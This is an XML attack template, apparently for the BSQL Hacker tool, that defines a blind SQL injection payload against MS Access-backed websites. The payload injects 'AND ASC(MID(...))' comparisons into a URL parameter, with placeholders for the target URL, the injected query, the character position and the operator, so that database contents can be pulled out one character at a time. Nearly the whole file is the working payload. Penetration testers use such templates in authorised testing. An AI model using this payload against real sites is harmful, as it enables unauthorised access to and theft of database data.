﻿<bsql>
  <author>
    Ferruh Mavituna - http://ferruh.mavituna.com
  </author>
  <name>Template - MSAccess - Blind SQL Injection (Manual Length)</name>
  <query>
    <![CDATA[
    {{URL:Enter the URL of the target like http://www.example.com/}}?p=1 AND ASC(MID(({INJECTION}),{POSITION},1)){OPERATION}{CHAR}--
    ]]>
  </query>
  <!--
  Length can not be identified on the fly by BSQL Hacker. It's in the todo list.
  -->
  <detectiontype><![CDATA[AutoSignatures]]></detectiontype>
</bsql>